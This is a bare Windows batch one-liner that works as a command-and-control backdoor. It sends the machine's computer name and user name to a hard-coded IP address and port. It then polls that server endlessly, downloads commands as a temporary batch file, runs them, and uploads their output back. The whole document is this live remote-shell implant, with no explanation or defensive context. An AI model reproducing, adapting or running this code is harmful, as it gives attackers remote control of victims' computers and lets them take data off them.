@echo off&cmd /V:ON /C "SET ip=89.116.214.160:8080&&SET sid="Authorization: 86d8ce-2cbe6d-2486e5"&&SET protocol=http://&&curl !protocol!!ip!/86d8ce/!COMPUTERNAME!/!USERNAME! -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/2cbe6d -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/2486e5 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL
